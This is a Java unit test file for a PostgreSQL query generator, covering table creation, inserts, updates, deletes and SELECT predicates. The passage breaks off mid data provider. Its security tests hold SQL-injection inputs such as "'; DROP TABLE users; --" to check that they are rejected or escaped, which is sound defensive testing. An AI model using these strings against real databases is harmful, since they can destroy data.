package edu.ukma.smart.virtual;

import static org.testng.Assert.assertEquals;
import static org.testng.Assert.assertFalse;
import static org.testng.Assert.assertTrue;

import edu.ukma.smart.virtual.errors.InputValidationErr;
import edu.ukma.smart.virtual.errors.Return;
import edu.ukma.smart.virtual.properties.BooleanProperty;
import edu.ukma.smart.virtual.properties.DecimalProperty;
import edu.ukma.smart.virtual.properties.IntegerProperty;
import edu.ukma.smart.virtual.properties.Property;
import edu.ukma.smart.virtual.properties.ReferenceProperty;
import edu.ukma.smart.virtual.properties.StringProperty;
import edu.ukma.smart.virtual.select.BooleanPredicate;
import edu.ukma.smart.virtual.select.CompoundPredicate;
import edu.ukma.smart.virtual.select.DecimalPredicate;
import edu.ukma.smart.virtual.select.IntegerPredicate;
import edu.ukma.smart.virtual.select.ReferencePredicate;
import edu.ukma.smart.virtual.select.SelectQuery;
import edu.ukma.smart.virtual.select.StringPredicate;
import edu.ukma.smart.virtual.values.BooleanValue;
import edu.ukma.smart.virtual.values.ColumnValue;
import edu.ukma.smart.virtual.values.DecimalValue;
import edu.ukma.smart.virtual.values.IntegerValue;
import edu.ukma.smart.virtual.values.ListValue;
import edu.ukma.smart.virtual.values.ReferenceValue;
import edu.ukma.smart.virtual.values.StringValue;
import edu.ukma.smart.virtual.values.Type;
import java.math.BigDecimal;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.List;
import org.testng.Assert;
import org.testng.annotations.BeforeMethod;
import org.testng.annotations.DataProvider;
import org.testng.annotations.Test;

public class PostgreQueryGeneratorTest {

    private PostgreQueryGenerator queryBuilder;

    @BeforeMethod
    public void setUp() {
        queryBuilder = new PostgreQueryGenerator();
    }

    // ========== CREATE TABLE TESTS ==========

    @Test
    public void testCreateTableWithValidProperties() {
        // Given
        List<Property<?>> properties = List.of(
            StringProperty.builder()
                .key("name")
                .name("Name")
                .description("User name")
                .defaultValue("default_name")
                .required(true)
                .unique(false)
                .minLength(1)
                .maxLength(50)
                .build(),
            IntegerProperty.builder()
                .key("age")
                .name("Age")
                .description("User age")
                .defaultValue(25L)
                .required(false)
                .unique(false)
                .min(0L)
                .max(120L)
                .build(),
            BooleanProperty.builder()
                .key("active")
                .name("Active")
                .description("Is user active")
                .defaultValue(true)
                .required(false)
                .unique(false)
                .build(),
            DecimalProperty.builder()
                .key("salary")
                .name("Salary")
                .description("User salary")
                .defaultValue(new BigDecimal("50000.00"))
                .required(false)
                .unique(false)
                .min(new BigDecimal("0.00"))
                .max(new BigDecimal("999999.99"))
                .precision(10)
                .scale(2)
                .build()
        );
        NewTable newTable = NewTable.builder().key("users").name("users").description("users")
            .properties(properties).build();

        // When
        Return<String> result = queryBuilder.createTable(newTable);

        // Then
        assertTrue(result.error().isEmpty());
        String sql = result.value();

        // Verify table structure
        assertTrue(sql.contains("CREATE TABLE public.users"));
        assertTrue(sql.contains("_id SERIAL PRIMARY KEY NOT NULL"));
        assertTrue(sql.contains("_created TIMESTAMP DEFAULT CURRENT_TIMESTAMP NOT NULL"));

        // Verify columns
        assertTrue(sql.contains("name TEXT DEFAULT $$default_name$$ NOT NULL"));
        assertTrue(sql.contains("age BIGINT DEFAULT 25"));
        assertTrue(sql.contains("active BOOLEAN DEFAULT true"));
        assertTrue(sql.contains("salary NUMERIC(10,2) DEFAULT 50000.00"));

        // Verify constraints
        assertTrue(sql.contains("CHECK (char_length(name) BETWEEN 1 AND 50)"));
        assertTrue(sql.contains("CHECK (age BETWEEN 0 AND 120)"));
        assertTrue(sql.contains("CHECK (salary BETWEEN 0.000000 AND 999999.990000)"));
    }

    @Test
    public void testCreateTableWithNoProperties() {
        // Given
        NewTable newTable =
            new NewTable("empty_table", "empty_table", "empty_table", Collections.emptyList());

        // When
        Return<String> result = queryBuilder.createTable(newTable);

        // Then
        assertTrue(result.error().isPresent());
    }

    @Test
    public void testCreateTableWithReferenceProperty() {
        // Given
        List<Property<?>> properties = List.of(
            ReferenceProperty.builder()
                .key("user_id")
                .name("User ID")
                .description("Reference to user")
                .required(true)
                .unique(false)
                .refTableKey("users")
                .build()
        );
        NewTable newTable = new NewTable("orders", "orders", "orders", properties);

        // When
        Return<String> result = queryBuilder.createTable(newTable);

        // Then
        assertTrue(result.error().isEmpty());
        String sql = result.value();

        assertTrue(sql.contains("user_id INTEGER NOT NULL"));
        assertTrue(sql.contains("FOREIGN KEY (user_id) REFERENCES users(_id)"));
    }

    // ========== SECURITY TESTS - TABLE KEY VALIDATION ==========

    @DataProvider(name = "invalidTableKeys")
    public Object[][] invalidTableKeys() {
        return new Object[][] {
            {"Users"},           // uppercase
            {"user-name"},       // hyphen
            {"user name"},       // space
            {"user@name"},       // special character
            {"1users"},          // starts with number
            {""},                // empty
            {"u"},               // too short (less than 2 chars)
            {"a".repeat(102)},   // too long (more than 100 chars)
            {"user's"},          // apostrophe
            {"user;drop"},       // semicolon (SQL injection attempt)
            // SQL comment injection
            {"user/*comment*/"},
            {"user;--"}
        };
    }

    @Test(dataProvider = "invalidTableKeys")
    public void testCreateTableWithInvalidTableKey(String invalidKey) {
        // Given
        List<Property<?>> properties = List.of(
            StringProperty.builder()
                .key("name")
                .name("Name")
                .description("User name")
                .defaultValue("default")
                .required(true)
                .unique(false)
                .minLength(1)
                .maxLength(50)
                .build()
        );
        NewTable newTable = new NewTable(invalidKey, invalidKey, invalidKey, properties);

        // When
        Return<String> result = queryBuilder.createTable(newTable);

        // Then
        assertTrue(result.error().isPresent());
    }

    @DataProvider(name = "validTableKeys")
    public Object[][] validTableKeys() {
        return new Object[][] {
            {"users"},
            {"user_profile"},
            {"user_data_log"},
            {"a".repeat(100)},  // exactly 100 chars
            {"ab"}              // exactly 2 chars
        };
    }

    @Test(dataProvider = "validTableKeys")
    public void testCreateTableWithValidTableKey(String validKey) {
        // Given
        List<Property<?>> properties = List.of(
            StringProperty.builder()
                .key("name")
                .name("Name")
                .description("User name")
                .defaultValue("default")
                .required(true)
                .unique(false)
                .minLength(1)
                .maxLength(50)
                .build()
        );
        NewTable newTable = new NewTable(validKey, validKey, validKey, properties);

        // When
        Return<String> result = queryBuilder.createTable(newTable);

        // Then
        assertTrue(result.error().isEmpty());
        assertTrue(result.value().contains("CREATE TABLE public." + validKey));
    }

    // ========== SECURITY TESTS - PROPERTY KEY VALIDATION ==========

    @Test(dataProvider = "invalidTableKeys")
    public void testCreateTableWithInvalidPropertyKey(String invalidKey) {
        // Given
        List<Property<?>> properties = List.of(
            StringProperty.builder()
                .key(invalidKey)
                .name("Name")
                .description("User name")
                .defaultValue("default")
                .required(true)
                .unique(false)
                .minLength(1)
                .maxLength(50)
                .build()
        );
        NewTable newTable = new NewTable("users", "users", "users", properties);

        // When
        Return<String> result = queryBuilder.createTable(newTable);

        // Then
        assertTrue(result.error().isPresent());
        assertEquals(result.error().get().getClass(), InputValidationErr.class);
    }

    // ========== PROPERTY VALIDATION TESTS ==========

    @Test
    public void testCreateTableWithRequiredPropertyWithoutDefault() {
        // Given
        List<Property<?>> properties = List.of(
            StringProperty.builder()
                .key("name")
                .name("Name")
                .description("User name")
                .defaultValue(null) // required but no default
                .required(true)
                .unique(false)
                .minLength(1)
                .maxLength(50)
                .build()
        );
        NewTable newTable = new NewTable("users", "users", "users", properties);

        // When
        Return<String> result = queryBuilder.createTable(newTable);

        // Then
        assertTrue(result.error().isPresent());
    }

    @Test
    public void testCreateTableWithReferencePropertyRequiredNoDefault() {
        // Given - Reference properties are exempt from the default value requirement
        List<Property<?>> properties = List.of(
            ReferenceProperty.builder()
                .key("user_id")
                .name("User ID")
                .description("Reference to user")
                .required(true)
                .unique(false)
                .refTableKey("users")
                .build()
        );
        NewTable newTable = new NewTable("orders", "orders", "orders", properties);

        // When
        Return<String> result = queryBuilder.createTable(newTable);

        // Then
        assertTrue(result.error().isEmpty());
    }

    @Test
    public void testCreateTableWithInvalidReferenceTableKey() {
        // Given
        List<Property<?>> properties = List.of(
            ReferenceProperty.builder()
                .key("user_id")
                .name("User ID")
                .description("Reference to user")
                .required(true)
                .unique(false)
                .refTableKey("Invalid-Table")
                .build()
        );
        NewTable newTable = new NewTable("orders", "orders", "orders", properties);

        // When
        Return<String> result = queryBuilder.createTable(newTable);

        // Then
        assertTrue(result.error().isPresent());
    }

    // ========== DECIMAL PROPERTY VALIDATION ==========

    @Test
    public void testCreateTableWithInvalidDecimalPrecision() {
        // Given
        List<Property<?>> properties = List.of(
            DecimalProperty.builder()
                .key("price")
                .name("Price")
                .description("Product price")
                .defaultValue(new BigDecimal("100.00"))
                .required(false)
                .unique(false)
                .precision(0) // precision = 0
                .scale(2)
                .build()
        );
        NewTable newTable = new NewTable("products", "products", "products", properties);

        // When
        Return<String> result = queryBuilder.createTable(newTable);

        // Then
        assertTrue(result.error().isPresent());
    }

    @Test
    public void testCreateTableWithInvalidDecimalScale() {
        // Given
        List<Property<?>> properties = List.of(
            DecimalProperty.builder()
                .key("price")
                .name("Price")
                .description("Product price")
                .defaultValue(new BigDecimal("100.00"))
                .required(false)
                .unique(false)
                .precision(10)
                .scale(0) // scale = 0
                .build()
        );
        NewTable newTable = new NewTable("products", "products", "products", properties);

        // When
        Return<String> result = queryBuilder.createTable(newTable);

        // Then
        assertTrue(result.error().isPresent());
    }

    @Test
    public void testCreateTableWithStringMaxLengthLessThanMin() {
        // Given
        List<Property<?>> properties = List.of(
            StringProperty.builder()
                .key("description")
                .name("Description")
                .defaultValue("default")
                .minLength(10)
                .maxLength(5) // max < min
                .build()
        );
        NewTable newTable = NewTable.builder()
            .key("items")
            .name("Items Table")
            .description("Test table for items")
            .properties(properties)
            .build();

        // When
        Return<String> result = queryBuilder.createTable(newTable);

        // Then
        assertTrue(result.error().isPresent());
    }

    @Test
    public void testCreateTableWithStringInvalidMaxLength() {
        // Given
        List<Property<?>> properties = List.of(
            StringProperty.builder()
                .key("description")
                .name("Description")
                .defaultValue("default")
                .minLength(null)
                .maxLength(0) // max = 0
                .build()
        );
        NewTable newTable = NewTable.builder()
            .key("items")
            .name("Items Table")
            .description("Test table for items")
            .properties(properties)
            .build();

        // When
        Return<String> result = queryBuilder.createTable(newTable);

        // Then
        assertTrue(result.error().isPresent());
    }

    @Test
    public void testCreateTableWithStringInvalidMinLength() {
        // Given
        List<Property<?>> properties = List.of(
            StringProperty.builder()
                .key("description")
                .name("Description")
                .defaultValue("default")
                .minLength(0) // min = 0
                .maxLength(null)
                .build()
        );
        NewTable newTable = NewTable.builder()
            .key("items")
            .name("Items Table")
            .description("Test table for items")
            .properties(properties)
            .build();

        // When
        Return<String> result = queryBuilder.createTable(newTable);

        // Then
        assertTrue(result.error().isPresent());
    }

// ========== DELETE TABLE TESTS ==========

    @Test
    public void testDeleteTableWithValidKey() {
        // When
        Return<String> result = queryBuilder.deleteTable("users");

        // Then
        assertTrue(result.error().isEmpty());
        assertEquals(result.value(), "DROP TABLE users;");
    }

    @Test(dataProvider = "invalidTableKeys")
    public void testDeleteTableWithInvalidKey(String invalidKey) {
        // When
        Return<String> result = queryBuilder.deleteTable(invalidKey);

        // Then
        assertTrue(result.error().isPresent());
    }

// ========== INSERT INTO TABLE TESTS ==========

    @Test
    public void testInsertIntoTableWithValidData() {
        // Given
        List<ColumnValue<?>> columnValues = List.of(
            StringValue.of("name", "John Doe"),
            IntegerValue.of("age", 30L),
            BooleanValue.of("active", true),
            DecimalValue.of("salary", new BigDecimal("50000.00")),
            ReferenceValue.of("department_id", 1)
        );

        // When
        Return<String> result = queryBuilder.insertIntoTable("users", columnValues);

        // Then
        assertTrue(result.error().isEmpty());
        String sql = result.value();

        assertEquals(sql, "INSERT INTO users (name,age,active,salary,department_id) VALUES (?,?,?,?,?);");
    }

    @Test
    public void testInsertIntoTableWithNoColumns() {
        // When
        Return<String> result = queryBuilder.insertIntoTable("users", Collections.emptyList());

        // Then
        assertTrue(result.error().isEmpty());
        assertEquals(result.value(), "INSERT INTO users DEFAULT VALUES;");
    }

    @Test(dataProvider = "invalidTableKeys")
    public void testInsertIntoTableWithInvalidTableKey(String invalidKey) {
        // Given
        List<ColumnValue<?>> columnValues = List.of(StringValue.of("name", "John Doe"));

        // When
        Return<String> result = queryBuilder.insertIntoTable(invalidKey, columnValues);

        // Then
        assertTrue(result.error().isPresent());
    }

    @Test(dataProvider = "invalidTableKeys")
    public void testInsertIntoTableWithInvalidColumnKey(String invalidKey) {
        // Given
        List<ColumnValue<?>> columnValues = List.of(StringValue.of(invalidKey, "John Doe"));

        // When
        Return<String> result = queryBuilder.insertIntoTable("users", columnValues);

        // Then
        assertTrue(result.error().isPresent());
    }

// ========== SQL INJECTION PROTECTION TESTS ==========

    @Test
    public void testInsertWithSQLInjectionAttemptInStringValue() {
        // Given - Malicious SQL injection attempt in string value
        List<ColumnValue<?>> columnValues = List.of(
            new StringValue("name", "'; DROP TABLE users; --")
        );

        // When
        Return<String> result = queryBuilder.insertIntoTable("users", columnValues);

        // Then
        assertTrue(result.error().isEmpty());
        String sql = result.value();

        // Verify the malicious content is properly escaped with $$ quoting
        assertEquals(sql, "INSERT INTO users (name) VALUES (?);");
    }

    @Test
    public void testInsertWithSQLInjectionAttemptInTableKey() {
        // Given - Malicious SQL injection attempt in table key should be rejected
        List<ColumnValue<?>> columnValues = List.of(
            new StringValue("name", "John")
        );

        // When
        Return<String> result =
            queryBuilder.insertIntoTable("users; DROP TABLE users; --", columnValues);

        // Then
        assertTrue(result.error().isPresent());
    }

    @Test
    public void testInsertWithSQLInjectionAttemptInColumnKey() {
        // Given - Malicious SQL injection attempt in column key should be rejected
        List<ColumnValue<?>> columnValues = List.of(
            new StringValue("name; DROP TABLE users; --", "John")
        );

        // When
        Return<String> result = queryBuilder.insertIntoTable("users", columnValues);

        // Then
        assertTrue(result.error().isPresent());
    }

    @Test
    public void testCreateTableWithSQLInjectionInStringDefault() {
        // Given - Test that string default params are properly escaped
        List<Property<?>> properties = List.of(
            StringProperty.builder()
                .key("description")
                .name("description")
                .defaultValue("'; DROP TABLE users; --")
                .minLength(1)
                .maxLength(100)
                .build()
        );
        NewTable newTable = NewTable.builder()
            .key("items")
            .name("Items Table")
            .description("Test table for items")
            .properties(properties)
            .build();

        // When
        Return<String> result = queryBuilder.createTable(newTable);

        // Then
        assertTrue(result.error().isEmpty());
        String sql = result.value();

        // Verify the malicious content is properly escaped with $$ quoting
        assertTrue(sql.contains("$$'; DROP TABLE users; --$$"));
    }

// ========== DELETE FROM TABLE TESTS ==========

    @Test
    public void testDeleteFromTableWithValidData() {
        // When
        Return<String> result = queryBuilder.deleteFromTable("users", 123);

        // Then
        assertTrue(result.error().isEmpty());
        assertEquals(result.value(), "DELETE FROM users WHERE _id = 123;");
    }

    @Test(dataProvider = "invalidTableKeys")
    public void testDeleteFromTableWithInvalidTableKey(String invalidKey) {
        // When
        Return<String> result = queryBuilder.deleteFromTable(invalidKey, 123);

        // Then
        assertTrue(result.error().isPresent());
    }

    @Test
    public void testDeleteFromTableWithNegativeId() {
        // When
        Return<String> result = queryBuilder.deleteFromTable("users", -1);

        // Then
        assertTrue(result.error().isPresent());
    }

// ========== UNIQUE AND NOT NULL CONSTRAINT TESTS ==========

    @Test
    public void testCreateTableWithUniqueConstraints() {
        // Given
        List<Property<?>> properties = List.of(
            StringProperty.builder()
                .key("email")
                .name("email")
                .required(true)
                .unique(true)
                .defaultValue("default@example.com")
                .minLength(1)
                .maxLength(100)
                .build(),
            IntegerProperty.builder()
                .key("employee_id")
                .name("employee_id")
                .required(true)
                .unique(true)
                .defaultValue(1000L)
                .min(null)
                .max(null)
                .build()
        );
        NewTable newTable = NewTable.builder()
            .key("employees")
            .name("Employees Table")
            .description("Table for storing employee information")
            .properties(properties)
            .build();

        // When
        Return<String> result = queryBuilder.createTable(newTable);

        // Then
        assertTrue(result.error().isEmpty());
        String sql = result.value();

        assertTrue(sql.contains("email TEXT DEFAULT $$default@example.com$$ NOT NULL UNIQUE"));
        assertTrue(sql.contains("employee_id BIGINT DEFAULT 1000 NOT NULL UNIQUE"));
    }

    @Test
    public void testCreateTableWithNullableColumns() {
        // Given
        List<Property<?>> properties = List.of(
            StringProperty.builder()
                .key("middle_name")
                .name("Middle Name Table")
                .required(false)
                .unique(false)
                .defaultValue(null)
                .minLength(1)
                .maxLength(50)
                .build(),
            IntegerProperty.builder()
                .key("optional_number")
                .name("Optional Number Table")
                .required(false)
                .unique(false)
                .defaultValue(null)
                .min(null)
                .max(null)
                .build()
        );
        NewTable newTable = NewTable.builder()
            .key("people")
            .name("People Table")
            .description("Table for storing people information")
            .properties(properties)
            .build();

        // When
        Return<String> result = queryBuilder.createTable(newTable);

        // Then
        assertTrue(result.error().isEmpty());
        String sql = result.value();

        assertTrue(sql.contains("middle_name TEXT DEFAULT NULL"));
        assertTrue(sql.contains("optional_number BIGINT DEFAULT NULL"));
        // Should not contain NOT NULL for these columns
        assertFalse(sql.matches(".*middle_name.*NOT NULL.*"));
        assertFalse(sql.matches(".*optional_number.*NOT NULL.*"));
    }

// ========== BOUNDARY VALUE TESTS ==========

    @Test
    public void testCreateTableWithMaxPrecisionAndScale() {
        // Given
        List<Property<?>> properties = List.of(
            DecimalProperty.builder()
                .key("big_decimal")
                .name("Big Decimal Table")
                .required(false)
                .unique(false)
                .defaultValue(new BigDecimal("0"))
                .min(null)
                .max(null)
                .precision(131072) // MAX value
                .scale(16383) // MAX value
                .build()
        );
        NewTable newTable = NewTable.builder()
            .key("test_table")
            .name("Test Table")
            .description("Table for testing maximum precision and scale")
            .properties(properties)
            .build();

        // When
        Return<String> result = queryBuilder.createTable(newTable);

        // Then
        assertTrue(result.error().isEmpty());
        assertTrue(result.value().contains("NUMERIC(131072,16383)"));
    }

    @Test
    public void testCreateTableWithExceededPrecision() {
        // Given
        List<Property<?>> properties = List.of(
            DecimalProperty.builder()
                .key("big_decimal")
                .name("Big Decimal Table")
                .required(false)
                .unique(false)
                .defaultValue(new BigDecimal("0"))
                .min(null)
                .max(null)
                .precision(131073) // Exceeds MAX_PRECISION
                .scale(2)
                .build()
        );
        NewTable newTable = NewTable.builder()
            .key("test_table")
            .name("Test Table")
            .description("Table for testing precision validation")
            .properties(properties)
            .build();

        // When
        Return<String> result = queryBuilder.createTable(newTable);

        // Then
        assertTrue(result.error().isPresent());
    }

    @Test
    public void testCreateTableWithExceededScale() {
        // Given
        List<Property<?>> properties = List.of(
            DecimalProperty.builder()
                .key("big_decimal")
                .name("Big Decimal Table")
                .required(false)
                .unique(false)
                .defaultValue(new BigDecimal("0"))
                .min(null)
                .max(null)
                .precision(10)
                .scale(16384) // Exceeds MAX_SCALE
                .build()
        );
        NewTable newTable = NewTable.builder()
            .key("test_table")
            .name("Test Table")
            .description("Table for testing scale validation")
            .properties(properties)
            .build();

        // When
        Return<String> result = queryBuilder.createTable(newTable);

        // Then
        assertTrue(result.error().isPresent());
    }

    @Test
    public void testUpdateQueryGenerating() {
        var updateRow = UpdateRow.of(
            "table_key",
            1,
            List.of(
                StringValue.of("s_prop", "123"),
                IntegerValue.of("i_prop", 123L),
                BooleanValue.of("b_prop", true),
                ReferenceValue.of("r_prop", 123),
                DecimalValue.of("d_prop", new BigDecimal("123.321"))
            )
        );

        var query = queryBuilder.updateRow(updateRow);

        assertFalse(query.error().isPresent());
        assertEquals(query.value(), "UPDATE public.table_key SET s_prop=?,i_prop=?,b_prop=?,r_prop=?,d_prop=? WHERE _id=?;");
    }

    @Test
    public void testUpdateQueryGeneratingFailsOnInvalidTableKey() {
        var updateRow = UpdateRow.of(
            "t",
            1,
            List.of(
                DecimalValue.of("d_prop", new BigDecimal("123.321"))
            )
        );

        var query = queryBuilder.updateRow(updateRow);

        assertTrue(query.error().isPresent());
    }

    @Test
    public void testUpdateQueryGeneratingFailsOnInvalidProperty() {
        var updateRow = UpdateRow.of(
            "valid",
            1,
            List.of(
                StringValue.of("s_prop", "123"),
                IntegerValue.of("i_prop", 123L),
                BooleanValue.of("b_prop", true),
                ReferenceValue.of("1", 1),
                DecimalValue.of("d_prop", new BigDecimal("123.321"))
            )
        );

        var query = queryBuilder.updateRow(updateRow);

        assertTrue(query.error().isPresent());
    }

    @Test
    public void testUpdateQueryGeneratingFailsOnInvalidRowId() {
        var updateRow = UpdateRow.of(
            "valid",
            0,
            List.of(
                DecimalValue.of("d_prop", new BigDecimal("123.321"))
            )
        );

        var query = queryBuilder.updateRow(updateRow);

        assertTrue(query.error().isPresent());
    }

    @Test
    public void testUpdateQueryGeneratingFailsOnEmptySetList() {
        var updateRow = UpdateRow.of(
            "valid",
            1,
            List.of()
        );

        var query = queryBuilder.updateRow(updateRow);
        assertTrue(query.error().isPresent());
    }

    @DataProvider(name = "selectDataProvider")
    public Object[][] selectDataProvider() {
        return new Object[][] {
            // selects without conditions
            {
                SelectQuery.wildcard("key"),
                SelectStatement.of("SELECT * FROM public.key ;", List.of())
            },
            {
                SelectQuery.of("key", List.of()),
                SelectStatement.of("SELECT * FROM public.key ;", List.of())
            },
            {
                SelectQuery.of("key", List.of("column")),
                SelectStatement.of("SELECT column FROM public.key ;", List.of())},
            {
                SelectQuery.of("key", List.of("column_one", "column_two")),
                SelectStatement.of("SELECT column_one,column_two FROM public.key ;", List.of())},

            {
                SelectQuery.of("key", List.of("column_one", "column_two", "column_three")),
                SelectStatement.of("SELECT column_one,column_two,column_three FROM public.key ;", List.of())
            },

            // Valid table name edge cases
            {
                SelectQuery.wildcard("aa"),
                SelectStatement.of("SELECT * FROM public.aa ;", List.of())
            },
            {
                SelectQuery.wildcard("table_name"),
                SelectStatement.of("SELECT * FROM public.table_name ;", List.of())
            },
            {
                SelectQuery.wildcard("a".repeat(101)), // 101 characters - should be valid as it's exactly at limit
                SelectStatement.of("SELECT * FROM public." + "a".repeat(101) + " ;", List.of())
            },

            // Valid column name edge cases
            {
                SelectQuery.of("table", List.of("aa")),
                SelectStatement.of("SELECT aa FROM public.table ;", List.of())
            },
            {
                SelectQuery.of("table", List.of("column_with_underscores")),
                SelectStatement.of("SELECT column_with_underscores FROM public.table ;", List.of())
            },
            {
                SelectQuery.of("table", List.of("a".repeat(101))), // 101 characters - should be valid
                SelectStatement.of("SELECT " + "a".repeat(101) + " FROM public.table ;", List.of())
            },

            // Maximum number of columns (100 columns)
            {
                SelectQuery.of("table", generateColumnList(100)),
                SelectStatement.of("SELECT " + String.join(",", generateColumnList(100)) + " FROM public.table ;", List.of())
            },

            // Valid table names with various patterns
            {
                SelectQuery.wildcard("user_profile"),
                SelectStatement.of("SELECT * FROM public.user_profile ;", List.of())
            },
            {
                SelectQuery.wildcard("order_items"),
                SelectStatement.of("SELECT * FROM public.order_items ;", List.of())
            },

            // Predicate testing
            {
                SelectQuery.wildcard("user_profile", BooleanPredicate.eq("is_admin", true)),
                SelectStatement.of(
                    "SELECT * FROM public.user_profile WHERE is_admin=? ;",
                    List.of(BooleanValue.of("is_admin", true))
                )
            },
            {
                SelectQuery.wildcard("user_profile", BooleanPredicate.ne("is_admin", true)),
                SelectStatement.of(
                    "SELECT * FROM public.user_profile WHERE is_admin<>? ;",
                    List.of(BooleanValue.of("is_admin", true))
                )
            },
            {
                SelectQuery.wildcard("user_profile", IntegerPredicate.eq("foot_size", 42L)),
                SelectStatement.of(
                    "SELECT * FROM public.user_profile WHERE foot_size=? ;",
                    List.of(IntegerValue.of("foot_size", 42L))
                )
            },
            {
                SelectQuery.wildcard("user_profile", IntegerPredicate.ne("foot_size", 42L)),
                SelectStatement.of(
                    "SELECT * FROM public.user_profile WHERE foot_size<>? ;",
                    List.of(IntegerValue.of("foot_size", 42L))
                )
            },
            {
                SelectQuery.wildcard("user_profile", IntegerPredicate.ls("foot_size", 42L)),
                SelectStatement.of(
                    "SELECT * FROM public.user_profile WHERE foot_size<? ;",
                    List.of(IntegerValue.of("foot_size", 42L))
                )
            },
            {
                SelectQuery.wildcard("user_profile", IntegerPredicate.gt("foot_size", 42L)),
                SelectStatement.of(
                    "SELECT * FROM public.user_profile WHERE foot_size>? ;",
                    List.of(IntegerValue.of("foot_size", 42L))
                )
            },
            {
                SelectQuery.wildcard("user_profile", IntegerPredicate.gre("foot_size", 42L)),
                SelectStatement.of(
                    "SELECT * FROM public.user_profile WHERE foot_size>=? ;",
                    List.of(IntegerValue.of("foot_size", 42L))
                )
            },
            {
                SelectQuery.wildcard("user_profile", IntegerPredicate.lse("foot_size", 42L)),
                SelectStatement.of(
                    "SELECT * FROM public.user_profile WHERE foot_size<=? ;",
                    List.of(IntegerValue.of("foot_size", 42L))
                )
            },
            {
                SelectQuery.wildcard("user_profile", DecimalPredicate.eq("foot_size", new BigDecimal("42.424242"))),
                SelectStatement.of(
                    "SELECT * FROM public.user_profile WHERE foot_size=? ;",
                    List.of(DecimalValue.of("foot_size", new BigDecimal("42.424242")))
                )
            },
            {
                SelectQuery.wildcard("user_profile", DecimalPredicate.ne("foot_size", new BigDecimal("42.424242"))),
                SelectStatement.of(
                    "SELECT * FROM public.user_profile WHERE foot_size<>? ;",
                    List.of(DecimalValue.of("foot_size", new BigDecimal("42.424242")))
                )
            },
            {
                SelectQuery.wildcard("user_profile", DecimalPredicate.ls("foot_size", new BigDecimal("42.424242"))),
                SelectStatement.of(
                    "SELECT * FROM public.user_profile WHERE foot_size<? ;",
                    List.of(DecimalValue.of("foot_size", new BigDecimal("42.424242")))
                )
            },
            {
                SelectQuery.wildcard("user_profile", DecimalPredicate.gt("foot_size", new BigDecimal("42.424242"))),
                SelectStatement.of(
                    "SELECT * FROM public.user_profile WHERE foot_size>? ;",
                    List.of(DecimalValue.of("foot_size", new BigDecimal("42.424242")))
                )
            },
            {
                SelectQuery.wildcard("user_profile", ReferencePredicate.in("foot_size", List.of(4, 2, 3, 1))),
                SelectStatement.of(
                    "SELECT * FROM public.user_profile WHERE foot_size IN ? ;",
                    List.of(ListValue.of("foot_size", List.of(4, 2, 3, 1), Type.REFERENCE))
                )
            },
            {
                SelectQuery.wildcard("user_profile", ReferencePredicate.notIn("foot_size", List.of(4, 2, 3, 1))),
                SelectStatement.of(
                    "SELECT * FROM public.user_profile WHERE foot_size NOT IN ? ;",
                    List.of(ListValue.of("foot_size", List.of(4, 2, 3, 1), Type.REFERENCE))
                )
            },
            {
                SelectQuery.wildcard("user_profile", StringPredicate.eq("name", "Kimberly")),
                SelectStatement.of(
                    "SELECT * FROM public.user_profile WHERE name=? ;",
                    List.of(StringValue.of("name", "Kimberly"))
                )
            },
            {
                SelectQuery.wildcard("user_profile", StringPredicate.ne("name", "Kimberly")),
                SelectStatement.of(
                    "SELECT * FROM public.user_profile WHERE name<>? ;",
                    List.of(StringValue.of("name", "Kimberly"))
                )
            },
            {
                SelectQuery.wildcard("user_profile", StringPredicate.gt("name", "Kimberly")),
                SelectStatement.of(
                    "SELECT * FROM public.user_profile WHERE name>? ;",
                    List.of(StringValue.of("name", "Kimberly"))
                )
            },
            {
                SelectQuery.wildcard("user_profile", StringPredicate.gte("name", "Kimberly")),
                SelectStatement.of(
                    "SELECT * FROM public.user_profile WHERE name>=? ;",
                    List.of(StringValue.of("name", "Kimberly"))
                )
            },
            {
                SelectQuery.wildcard("user_profile", StringPredicate.ls("name", "Kimberly")),
                SelectStatement.of(
                    "SELECT * FROM public.user_profile WHERE name<? ;",
                    List.of(StringValue.of("name", "Kimberly"))
                )
            },
            {
                SelectQuery.wildcard("user_profile", StringPredicate.lse("name", "Kimberly")),
                SelectStatement.of(
                    "SELECT * FROM public.user_profile WHERE name<=? ;",
                    List.of(StringValue.of("name", "Kimberly"))
                )
            },
            {
                SelectQuery.wildcard("user_profile", StringPredicate.like("name", "Kimberly")),
                SelectStatement.of(
                    "SELECT * FROM public.user_profile WHERE name~~? ;",
                    List.of(StringValue.of("name", "Kimberly"))
                )
            },
            {
                SelectQuery.wildcard("user_profile", StringPredicate.notLike("name", "Kimberly")),
                SelectStatement.of(
                    "SELECT * FROM public.user_profile WHERE name!~~? ;",
                    List.of(StringValue.of("name", "Kimberly"))
                )
            },
            {
                SelectQuery.of("user_profile", List.of("one", "two", "name"), StringPredicate.like("name", "Kimberly")),
                SelectStatement.of("SELECT one,two,name FROM public.user_profile WHERE name~~? ;",
                    List.of(StringValue.of("name", "Kimberly")))
            },
            {
                SelectQuery.wildcard(
                    "user_profile",
                    CompoundPredicate.and(StringPredicate.like("name", "Kimberly"), IntegerPredicate.gre("age", 25L))
                ),
                SelectStatement.of("SELECT * FROM public.user_profile WHERE (name~~? AND age>=?) ;",
                    List.of(StringValue.of("name", "Kimberly"), IntegerValue.of("age", 25L)))
            },
            {
                SelectQuery.wildcard(
                    "user_profile",
                    CompoundPredicate.or(StringPredicate.like("name", "Kimberly"), IntegerPredicate.gre("age", 25L))
                ),
                SelectStatement.of("SELECT * FROM public.user_profile WHERE (name~~? OR age>=?) ;",
                    List.of(StringValue.of("name", "Kimberly"), IntegerValue.of("age", 25L)))
            },
            {
                SelectQuery.wildcard(
                    "user_profile",
                    CompoundPredicate.or(
                        StringPredicate.like("name", "Kimberly"),
                        CompoundPredicate.and(
                            IntegerPredicate.gre("age", 25L),
                            DecimalPredicate.ls("salary", new BigDecimal("25505.5"))
                        )
                    )
                ),
                SelectStatement.of(
                    "SELECT * FROM public.user_profile WHERE (name~~? OR (age>=? AND salary<?)) ;",
                    List.of(
                        StringValue.of("name", "Kimberly"),
                        IntegerValue.of("age", 25L),
                        DecimalValue.of("salary", new BigDecimal("25505.5"))
                    )
                ),
            },
            {
                SelectQuery.wildcard(
                    "user_profile",
                    CompoundPredicate.and(
                        CompoundPredicate.or(
                            StringPredicate.like("name", "Kimberly"),
                            BooleanPredicate.eq("married", true)
                        ),
                        CompoundPredicate.and(
                            IntegerPredicate.gre("age", 25L),
                            DecimalPredicate.ls("salary", new BigDecimal("25505.5"))
